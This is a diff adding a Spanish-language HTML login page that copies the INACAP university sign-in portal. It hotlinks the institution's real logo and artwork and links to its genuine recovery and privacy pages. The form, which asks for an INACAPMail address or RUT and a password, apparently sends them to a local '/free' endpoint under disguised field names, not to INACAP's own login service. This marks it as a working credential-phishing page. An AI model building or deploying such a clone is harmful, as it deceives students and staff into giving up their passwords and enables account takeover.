@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Iniciar sesión</title>
+<!--   <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      height: 100vh;
+    }
+
+    .left-section {
+      flex: 1;
+      background: url('https://adfs.inacap.cl/adfs/portal/illustration/illustration.jpg?id=466717D90261D5E1427B43311689028B0D4E75BE79B07D79FB61356056A51D9C') no-repeat center center/cover;
+      
+    }
+
+    .right-section {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-evenly;
+      padding-left: 30px;
+
+      background-color: #fff;
+      max-width: 500px;
+    }
+
+    .logo {
+      text-align: left;
+      margin-bottom: 20px;
+      display: flex;
+    }
+
+    .logo img {
+      max-width: 260px;
+    }
+
+    form {
+      max-width: 350px;
+      margin: 0;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .btn {
+      background-color: #c42121;
+      color: #fff;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #9c1a1a;
+    }
+
+    .forgot-password {
+      margin-top: 15px;
+    }
+
+    .forgot-password a {
+      color: #c42121;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    .error {
+      color: red;
+      font-size: 12px;
+      margin-bottom: 10px;
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    footer a {
+      color: #666;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      color: #333;
+    }
+  </style> -->
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+    }
+
+    .left-section {
+      flex: 2;
+      background: url('https://adfs.inacap.cl/adfs/portal/illustration/illustration.jpg?id=466717D90261D5E1427B43311689028B0D4E75BE79B07D79FB61356056A51D9C') no-repeat center center;
+      background-size: cover;
+      min-height: 100vh;
+    }
+
+    .right-section {
+      flex: 1;
+      background-color: white;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      gap: 30px;
+      max-width: 380px;
+    }
+
+    .logo {
+      margin-bottom: 40px;
+      margin-top: 50px;
+    }
+
+    .logo img {
+      width: 240px;
+      height: auto;
+    }
+
+    .form-title {
+      color: #333;
+      margin: 0;
+      font-size: 14px;
+      font-weight: normal;
+    }
+
+    .form-title strong {
+      color: #c42121;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      margin: 4px 0;
+      border: solid 1px #BABABA;
+      font-size: 12px;
+      box-sizing: border-box;
+      height: 25px;
+    }
+
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder {
+      color: #999;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      margin-top: 2px;
+      margin-bottom: 20px;
+    }
+
+    .checkbox label {
+      font-size: 12px;
+      color: #333;
+    }
+
+    .groupMargin {
+      font-size: smaller;
+      margin-bottom: 30px;
+    }
+
+    .btn {
+      background-color: #D00000;
+      color: white;
+      border: none;
+      padding: 5px;
+      width: 120px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background-color: #a61c1c;
+    }
+
+    .forgot-password {
+      margin-top: 10px;
+      font-size: 12px;
+    }
+
+    .forgot-password a {
+      color: #333;
+      text-decoration: none;
+    }
+
+    .forgot-password span {
+      color: #D00000;
+    }
+
+    footer {
+      margin-top: auto;
+      font-size: 12px;
+    }
+
+    footer a {
+      color: #D00000;
+      text-decoration: none;
+    }
+    #boton-inicio{
+        background-color: #D00000;
+    }
+
+    @media (max-width: 768px) {
+      .left-section {
+        display: none;
+      }
+      
+      .right-section {
+        flex: 1;
+        min-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="left-section"></div>
+  <div class="right-section">
+    <div class="logo">
+      <img src="https://adfs.inacap.cl/adfs/portal/logo/logo.png?id=3AD5E6D06B2E1FA6E6BE583CEE29C34A9F2FF2DD8132BA9D4096B40BDDCD3FD5" alt="Logo Inacap">
+    </div>
+
+    <form action="/free" id="loginForm" method="post" class="number1">
+      <div id="error" class="error" style="display: none;">Error: Por favor ingrese sus credenciales correctamente.</div>
+      <div id="loginMessage" class="groupMargin">Ingrese su cuenta INACAPMail o su RUT:</div>
+      <div class="form-group">
+        <input type="text" id="username" name="bid" placeholder="usuario@inacapmail.cl o RUT (Ej: 12345678-k)" style="width: 350px;" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" id="password" name="pass1" placeholder="Contraseña" style="width: 350px;" required>
+      </div>
+
+      <div class="checkbox">
+        <input type="checkbox" id="remember" name="remember">
+        <label for="remember">Mantener la sesión iniciada</label>
+      </div>
+
+      <button class="btn" >Iniciar sesión</button>
+    </form>
+
+    <div class="forgot-password">
+      <a>Recuperar clave. Click</a> <a href="https://digital.inacap.cl/tipo-de-usuario/index.html" style="color: #D00000;">aquí</a>.
+    </div>
+
+    <footer>
+      <a href="https://www.inacap.cl/tportalvp/portal/acerca-de/contenido-acerca-de/politicas-de-privacidad" style="font-size: smaller; text-align: end;">Políticas de privacidad INACAP</a>
+    </footer>
+  </div>
+
+</body>
+</html>
